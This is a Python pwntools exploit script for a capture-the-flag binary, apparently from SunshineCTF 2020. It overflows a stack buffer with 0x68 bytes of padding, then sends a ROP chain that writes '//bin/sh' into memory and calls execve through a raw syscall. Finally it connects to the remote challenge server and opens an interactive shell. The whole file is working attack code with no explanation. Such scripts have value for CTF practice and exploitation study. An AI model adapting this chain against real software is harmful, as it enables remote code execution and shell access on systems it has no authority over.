from pwn import *
binary = context.binary = ELF('./chall_14')
from struct import pack


p = lambda x : pack('Q',x)
IMAGE_BASE_0 = 0x0000000000400000 # 913a7aa51d9185a1088a36aa69b5a863758c4a92a8f050297c9491bd33b78d65
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret;

r = remote('chal.2020.sunshinectf.org',30014)
payload = b'A'*0x68
payload += rop
r.sendline('IxZ')
r.sendline(payload)
r.interactive()

